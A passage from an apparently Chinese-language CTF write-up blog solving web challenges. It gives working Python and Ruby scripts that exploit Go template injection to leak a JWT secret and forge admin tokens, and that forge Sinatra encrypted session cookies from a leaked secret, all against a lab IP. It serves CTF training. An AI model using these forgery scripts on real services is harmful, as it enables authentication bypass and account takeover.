class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">regist</span><br><span class="hljs-string">auth &#123;&quot;status&quot;:true,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImFhYSIsImlzX2FkbWluIjpmYWxzZX0.6uGWxgr0rCe9iAvgIagMd8knwDQmnoIpSJyjC3IV3ZM&quot;&#125;</span><br><span class="hljs-string">token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImFhYSIsImlzX2FkbWluIjpmYWxzZX0.6uGWxgr0rCe9iAvgIagMd8knwDQmnoIpSJyjC3IV3ZM</span><br><span class="hljs-string">Logged in as aaa</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<p>可以看到因为<code>template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)</code>，所以登录的用户的id会渲染在屏幕上，存在ssti</p>
<p>可以用<code>&#123;&#123;printf "%#v" .&#125;&#125;</code>作为用户名来注册</p>
<p>登录后返回</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">Logged in as &amp;main.Account&#123;id:&quot;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">printf</span> \<span class="hljs-string">&quot;%#v\&quot; .&#125;&#125;&quot;</span>, pw:<span class="hljs-string">&quot;a&quot;</span>, is_admin:<span class="hljs-literal">false</span>, secret_key:<span class="hljs-string">&quot;iLe9rZ9sFIfMvPL6IiT+Ng==&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure>


<p>拿到key后就可以伪造jwt了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> jwt<br><br>url=<span class="hljs-string">&quot;http://10.151.151.41:33090&quot;</span><br>username = <span class="hljs-string">&quot;&#123;&#123;printf \&quot;%#v\&quot; .&#125;&#125;&quot;</span><br>password = <span class="hljs-string">&quot;a&quot;</span><br><br><br><span class="hljs-comment"># 获取token</span><br>requests.get(url+<span class="hljs-string">&quot;/regist&quot;</span>,params=&#123;<span class="hljs-string">&quot;id&quot;</span>:username,<span class="hljs-string">&quot;pw&quot;</span>:password&#125;)<br>r = requests.get(url+<span class="hljs-string">&quot;/auth&quot;</span>,params=&#123;<span class="hljs-string">&quot;id&quot;</span>:username,<span class="hljs-string">&quot;pw&quot;</span>:password&#125;)<br>token = r.json().get(<span class="hljs-string">&quot;token&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;token:&quot;</span>,token)<br><br><br><span class="hljs-comment"># 获取secret_key</span><br>r = requests.get(url+<span class="hljs-string">&quot;/&quot;</span>,headers=&#123;<span class="hljs-string">&quot;X-Token&quot;</span>:token&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br>secret_key = re.findall(<span class="hljs-string">r&#x27;secret_key:&quot;([^&quot;]+)&quot;&#x27;</span>,r.text)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>,secret_key)<br><br><br><span class="hljs-comment"># 伪造admin token</span><br><span class="hljs-comment"># header = &#123;&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125;</span><br><span class="hljs-comment"># payload = &#123;&quot;id&quot;: &#x27;admin&#x27;, &quot;is_admin&quot;: True&#125;</span><br><span class="hljs-comment"># h = base64.urlsafe_b64encode(json.dumps(header, separators=(&quot;,&quot;, &quot;:&quot;)).encode(&quot;utf-8&quot;)).rstrip(b&quot;=&quot;)</span><br><span class="hljs-comment"># p = base64.urlsafe_b64encode(json.dumps(payload, separators=(&quot;,&quot;, &quot;:&quot;)).encode(&quot;utf-8&quot;)).rstrip(b&quot;=&quot;)</span><br><span class="hljs-comment"># sig = hmac.new(secret_key.encode(&quot;utf-8&quot;), h + b&quot;.&quot; + p, hashlib.sha256).digest()</span><br><span class="hljs-comment"># s = base64.urlsafe_b64encode(sig).rstrip(b&quot;=&quot;)</span><br><span class="hljs-comment"># admin_token = (h + b&quot;.&quot; + p + b&quot;.&quot; + s).decode(&quot;utf-8&quot;)</span><br><span class="hljs-comment"># print(&quot;admin_token:&quot;,admin_token)</span><br>payload = &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;is_admin&quot;</span>: <span class="hljs-literal">True</span>&#125;<br>headers = &#123;<span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span>&#125;<br>admin_token = jwt.encode(payload, secret_key, algorithm=<span class="hljs-string">&quot;HS256&quot;</span>, headers=headers)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;admin_token:&quot;</span>, admin_token)<br><br><br><span class="hljs-comment"># 获取flag</span><br>r = requests.get(url+<span class="hljs-string">&quot;/flag&quot;</span>,headers=&#123;<span class="hljs-string">&quot;X-Token&quot;</span>:admin_token&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>







<h2 id="babyWeb"><a href="#babyWeb" class="headerlink" title="babyWeb"></a>babyWeb</h2><blockquote>
<p>If you wish to snatch the flag from my grasp, you must first cross 2048.<br>Difficultly: Easy</p>
</blockquote>
<p>网页js小游戏，flag在<code>/js/html_actuator.js</code>中</p>
<h2 id="ezRuby"><a href="#ezRuby" class="headerlink" title="ezRuby"></a>ezRuby</h2><blockquote>
<p>You might know what is Rust, so that you have to learn what is Ruby.<br>Difficulty: Medium</p>
</blockquote>
<p>来自 justCTF 2023 Dangerous</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;sinatra&quot;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;sqlite3&quot;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;erubi&quot;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;digest&quot;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;json&quot;</span><br><br>config = <span class="hljs-variable constant_">JSON</span>.parse(<span class="hljs-title class_">File</span>.read(<span class="hljs-string">&quot;./config.json&quot;</span>))<br><br>set <span class="hljs-symbol">:bind</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>enable <span class="hljs-symbol">:sessions</span><br>set <span class="hljs-symbol">:erb</span>, <span class="hljs-symbol">:escape_html</span> =&gt; <span class="hljs-literal">true</span><br><br>con = <span class="hljs-title class_">SQLite3::Database</span>.new <span class="hljs-string">&quot;sqlite.db&quot;</span><br><br>con.execute <span class="hljs-string">&quot;CREATE TABLE IF NOT EXISTS threads(</span><br><span class="hljs-string">        id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="hljs-string">        content TEXT,</span><br><span class="hljs-string">        ip TEXT,</span><br><span class="hljs-string">        username TEXT</span><br><span class="hljs-string">    );&quot;</span><br><br>con.execute <span class="hljs-string">&quot;CREATE TABLE IF NOT EXISTS replies(</span><br><span class="hljs-string">        id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="hljs-string">        content TEXT,</span><br><span class="hljs-string">        ip TEXT,</span><br><span class="hljs-string">        username TEXT,</span><br><span class="hljs-string">        thread_id INTEGER</span><br><span class="hljs-string">    );&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_threads</span>(<span class="hljs-params">con</span>)<br>  <span class="hljs-keyword">return</span> con.execute(<span class="hljs-string">&quot;SELECT * FROM threads ORDER BY id DESC;&quot;</span>)<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_replies</span>(<span class="hljs-params">con, id</span>)<br>  <span class="hljs-keyword">return</span> con.execute(<span class="hljs-string">&quot;SELECT *, null, 0 as p FROM threads WHERE id=?</span><br><span class="hljs-string">                    UNION SELECT *, 1 as p FROM replies WHERE thread_id=? order by p&quot;</span>, [id, id])<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_allowed_ip</span>(<span class="hljs-params">username, ip, config</span>)<br>  <span class="hljs-keyword">return</span> config[<span class="hljs-string">&quot;mods&quot;</span>].any? &#123;<br>    |<span class="hljs-params">mod</span>| mod[<span class="hljs-string">&quot;username&quot;</span>] == username <span class="hljs-keyword">and</span> mod[<span class="hljs-string">&quot;allowed_ip&quot;</span>] == ip<br>  &#125;<br><span class="hljs-keyword">end</span><br><br><br>get <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-variable">@threads</span> = get_threads(con)<br>  erb <span class="hljs-symbol">:index</span><br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&quot;/thread&quot;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:content</span>].<span class="hljs-literal">nil</span>? <span class="hljs-keyword">or</span> params[<span class="hljs-symbol">:content</span>] == <span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">raise</span> <span class="hljs-string">&quot;Thread content cannot be empty!&quot;</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">if</span> session[<span class="hljs-symbol">:username</span>] <span class="hljs-keyword">then</span><br>    username = is_allowed_ip(session[<span class="hljs-symbol">:username</span>], request.ip, config) ? session[<span class="hljs-symbol">:username</span>] : <span class="hljs-literal">nil</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-comment">#   con.execute(&quot;INSERT INTO threads (id, content, ip, username)</span><br><span class="hljs-comment">#             VALUES (?, ?, ?, ?)&quot;, [nil, params[:content], request.ip, username])</span><br>  redirect to(<span class="hljs-string">&quot;/<span class="hljs-subst">#&#123;con.execute(<span class="hljs-string">&#x27;SELECT last_insert_rowid()&#x27;</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/flag&quot;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> !session[<span class="hljs-symbol">:username</span>] <span class="hljs-keyword">then</span><br>    erb <span class="hljs-symbol">:login</span><br>  <span class="hljs-keyword">elsif</span> !is_allowed_ip(session[<span class="hljs-symbol">:username</span>], request.ip, config) <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-number">403</span>, <span class="hljs-string">&quot;You are connecting from untrusted IP!&quot;</span>]<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> config[<span class="hljs-string">&quot;flag&quot;</span>]<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&quot;/login&quot;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> config[<span class="hljs-string">&quot;mods&quot;</span>].any? &#123;<br>    |<span class="hljs-params">mod</span>| mod[<span class="hljs-string">&quot;username&quot;</span>] == params[<span class="hljs-symbol">:username</span>] <span class="hljs-keyword">and</span> mod[<span class="hljs-string">&quot;password&quot;</span>] == params[<span class="hljs-symbol">:password</span>]<br>  &#125; <span class="hljs-keyword">then</span><br>    session[<span class="hljs-symbol">:username</span>] = params[<span class="hljs-symbol">:username</span>]<br>    redirect to(<span class="hljs-string">&quot;/flag&quot;</span>)<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Incorrect credentials&quot;</span>]<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/:id&quot;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-variable">@id</span> = params[<span class="hljs-symbol">:id</span>]<br>  <span class="hljs-variable">@replies</span> = get_replies(con, <span class="hljs-variable">@id</span>)<br>  erb <span class="hljs-symbol">:thread</span><br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&quot;/:id&quot;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:content</span>].<span class="hljs-literal">nil</span>? <span class="hljs-keyword">or</span> params[<span class="hljs-symbol">:content</span>] == <span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">raise</span> <span class="hljs-string">&quot;Reply content cannot be empty!&quot;</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">if</span> session[<span class="hljs-symbol">:username</span>] <span class="hljs-keyword">then</span><br>    username = is_allowed_ip(session[<span class="hljs-symbol">:username</span>], request.ip, config) ? session[<span class="hljs-symbol">:username</span>] : <span class="hljs-literal">nil</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-variable">@id</span> = params[<span class="hljs-symbol">:id</span>]<br><span class="hljs-comment">#   con.execute(&quot;INSERT INTO replies (id, content, ip, username, thread_id)</span><br><span class="hljs-comment">#               VALUES (?, ?, ?, ?, ?)&quot;, [nil, params[:content], request.ip, username, <span class="hljs-doctag">@id</span>])</span><br>  redirect to(<span class="hljs-string">&quot;/<span class="hljs-subst">#&#123;<span class="hljs-variable">@id</span>&#125;</span>&quot;</span>)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>


<p>共有六个路由，功能分别如下</p>
<p><code>/</code>：展示主题帖列表，从 threads 表读取所有帖子并渲染 index<br><code>/thread</code>：创建新主题帖，校验 content<br><code>/flag</code>：未登录渲染登录页；已登录但 IP 不可信返回 403；已登录且 IP 可信则返回 flag<br><code>/login</code>：处理登录，校验是否在 config[“mods”]；成功写入会话并跳转到 flag 页面，失败返回 403<br><code>get /:id</code>：展示指定帖详情，查询该帖及其所有回复（UNION 合并，帖子在前），渲染 thread<br><code>post /:id</code>：给指定帖回帖，校验 content 非空；若会话用户名且 IP 可信则记录用户名</p>
<p>可以看到获得flag需要两个条件，用户和ip</p>
<hr>
<p>当用空的 content 访问 &#x2F;thread 或者 &#x2F;:id 时都能触发raise，会返回error page</p>
<p>可以泄露 secret key</p>
<p><img src="/img/wp/2025/xiaosai-5.png" srcset="/img/loading.gif" lazyload></p>
<p>通过key可以伪造session</p>
<p><a target="_blank" rel="noopener" href="https://github.com/sinatra/sinatra/blob/5f4dde19719505989905782a61a19c545df7f9f9/rack-protection/lib/rack/protection/encryptor.rb#L19">sinatra中的加密实现</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">数据首先通过 Marshal 进行序列化<br>然后使用 AES-256-GCM 加密，以 session secret 的前 32 个字节作为密钥<br>然后使用 URL-safe base64 编码加密数据、IV 和身份验证标签<br>最后加密数据、IV 和身份验证标签随后通过--分隔符连接起来<br></code></pre></td></tr></table></figure>

<p>伪造脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> rubymarshal.reader, rubymarshal.writer<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-comment"># 已知的服务器密钥，用于 AES-GCM 解密和重新加密 rack.session</span><br>secret = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;c089cdd0a034f5ad365ab3e809e5ac0ec2f6faa248800db6d87af7dff1b1aac16c14f6c2ccf01d7ecd2c8842cbdf6dcd8bb7d2a07eb3286679f66e1bd256845c&#x27;</span>)<br><br><span class="hljs-comment"># 从目标站点请求一次 flag 页面，以获取最新的 rack.session Cookie</span><br>response = requests.get(<span class="hljs-string">&#x27;http://10.151.151.41:33105/flag&#x27;</span>)<br>response.raise_for_status()  <span class="hljs-comment"># 若请求失败立刻抛异常，避免后续处理脏数据</span><br><br><span class="hljs-comment"># rack.session 会经过 URL 编码，需要先解码再拆分出密文、IV、认证标签</span><br>cookie = urllib.parse.unquote(response.cookies[<span class="hljs-string">&#x27;rack.session&#x27;</span>])<br>ct, iv, auth = <span class="hljs-built_in">map</span>(base64.b64decode, cookie.split(<span class="hljs-string">&#x27;--&#x27;</span>))<br><br><span class="hljs-comment"># 使用服务器密钥和原始 IV 解密，并验证 GCM 标签确保数据未被篡改</span><br>cipher = AES.new(secret[:<span class="hljs-number">32</span>], AES.MODE_GCM, iv)<br>dec = cipher.decrypt_and_verify(ct, auth)<br>d = rubymarshal.reader.loads(dec)  <span class="hljs-comment"># Rack 使用 Ruby Marshal 存储会话，因此需要反序列化</span><br><br><span class="hljs-comment"># 将会话中的用户名字段改为管理员身份</span><br>d[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;xxxx&#x27;</span><br><span class="hljs-comment"># 重新使用 Ruby Marshal 序列化会话数据</span><br>m = rubymarshal.writer.writes(d)<br><br><span class="hljs-comment"># 复用原始的 IV 重新加密会话数据</span><br>cipher = AES.new(secret[:<span class="hljs-number">32</span>], AES.MODE_GCM, iv)<br>ct, auth = cipher.encrypt_and_digest(m)<br><br><span class="hljs-comment"># 将新的密文、IV、标签保持为 Base64 文本并拼接成最终 Cookie</span><br>ct, iv, auth = <span class="hljs-built_in">map</span>(base64.b64encode, [ct, iv, auth])<br>cookie = <span class="hljs-string">&#x27;--&#x27;</span>.join(part.decode() <span class="hljs-keyword">for</span> part <span class="hljs-keyword">in</span> (ct, iv, auth))<br><span class="hljs-built_in">print</span>(cookie)<br></code></pre></td></tr></table></figure>

<p>或者使用ruby的方式来伪造</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><br><br>use <span class="hljs-title class_">Rack</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Protection</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:EncryptedCookie</span>,<br>    <span class="hljs-symbol">:secret</span> =&gt; <span class="hljs-string">&quot;c089cdd0a034f5ad365ab3e809e5ac0ec2f6faa248800db6d87af7dff1b1aac16c14f6c2ccf01d7ecd2c8842cbdf6dcd8bb7d2a07eb3286679f66e1bd256845c&quot;</span><br><br>get <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">do</span><br>  session[<span class="hljs-symbol">:username</span>] = <span class="hljs-string">&#x27;xxxx&#x27;</span><br>  <span class="hljs-string">&quot;session: &quot;</span> + session.inspect<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>

<p>访问后复制rack.session即可</p>
<hr>
<p>然后需要伪造ip</p>
<p>在 thread.erb 中可以看到用 reply[2] 与 @id 拼成字符串后做 SHA256，再取前 6 位十六进制作为颜色值</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;% <span class="hljs-variable">@replies</span>.each <span class="hljs-keyword">do</span> |<span class="hljs-params">reply</span>| %&gt;<br>	&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;reply&quot;</span>&gt;<br>		&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;user-info&quot;</span>&gt;<br>			&lt;% user_color = <span class="hljs-title class_">Digest</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:SHA256</span>.hexdigest(reply[<span class="hljs-number">2</span>] + <span class="hljs-variable">@id</span>).slice(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) %&gt;<br>			&lt;div style=<span class="hljs-string">&quot;color: #&lt;%= user_color %&gt;;&quot;</span>&gt;<br>				&lt;%= user_color %&gt;<br>			&lt;% <span class="hljs-keyword">if</span> reply[<span class="hljs-number">3</span>] %&gt;<br>				&lt;span style=<span class="hljs-string">&quot;color: #ff0000;&quot;</span>&gt;<span class="hljs-comment">##Admin:&lt;%= reply[3] %&gt;##&lt;/span&gt;</span><br>			&lt;% <span class="hljs-keyword">end</span> %&gt;<br>			&lt;<span class="hljs-regexp">/div&gt;</span><br><span class="hljs-regexp">		&lt;/div</span>&gt;<br>		&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;reply-content&quot;</span>&gt;<br>			&lt;%= reply[<span class="hljs-number">1</span>] %&gt;<br>		&lt;<span class="hljs-regexp">/div&gt;</span><br><span class="hljs-regexp">	&lt;/div</span>&gt;<br>&lt;% <span class="hljs-keyword">end</span> %&gt;<br></code></pre></td></tr></table></figure>

<p>根据sql语句，可以知道reply[2]表示的就是ip地址</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ruby">con.execute <span class="hljs-string">&quot;CREATE TABLE IF NOT EXISTS threads(</span><br><span class="hljs-string">        id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="hljs-string">        content TEXT,</span><br><span class="hljs-string">        ip TEXT,</span><br><span class="hljs-string">        username TEXT</span><br><span class="hljs-string">    );&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_replies</span>(<span class="hljs-params">con, id</span>)<br>  <span class="hljs-keyword">return</span> con.execute(<span class="hljs-string">&quot;SELECT *, null, 0 as p FROM threads WHERE id=?</span><br><span class="hljs-string">                    UNION SELECT *, 1 as p FROM replies WHERE thread_id=? order by p&quot;</span>, [id, id])<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/:id&quot;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-variable">@id</span> = params[<span class="hljs-symbol">:id</span>]<br>  <span class="hljs-variable">@replies</span> = get_replies(con, <span class="hljs-variable">@id</span>)<br>  erb <span class="hljs-symbol">:thread</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>


<p>这样就可以在网页提取rgb值然后爆破ip</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># import requests</span><br><span class="hljs-comment"># import re</span><br><br><span class="hljs-comment"># URL1 = &quot;http://10.151.151.41:33105/1&quot;</span><br><span class="hljs-comment"># URL2 = &quot;http://10.151.151.41:33105/2&quot;</span><br><br><span class="hljs-comment"># PATTERN = re.compile(</span><br><span class="hljs-comment">#     r&#x27;&lt;div style=&quot;color: #([0-9a-fA-F]&#123;6&#125;);&quot;&gt;.*?&lt;span style=&quot;color: #ff0000;&quot;&gt;##Admin:(.*?)##&lt;/span&gt;&#x27;,</span><br><span class="hljs-comment">#     re.DOTALL</span><br><span class="hljs-comment"># )</span><br><br><span class="hljs-comment"># def extract_color(html: str):</span><br><span class="hljs-comment">#     for color_code, admin_name in PATTERN.findall(html):</span><br><span class="hljs-comment">#         if &quot;admin&quot; in admin_name.lower():</span><br><span class="hljs-comment">#             return color_code</span><br><span class="hljs-comment">#     return None</span><br><br><span class="hljs-comment"># c1 = extract_color(requests.get(URL1).text)</span><br><span class="hljs-comment"># c2 = extract_color(requests.get(URL2).text)</span><br><br><span class="hljs-comment"># print(f&quot;c1=&#x27;&#123;c1&#125;&#x27;\nc2=&#x27;&#123;c2&#125;&#x27;&quot;)</span><br><br><br><br><br><br><br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA256<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Pool<br><br>c1=<span 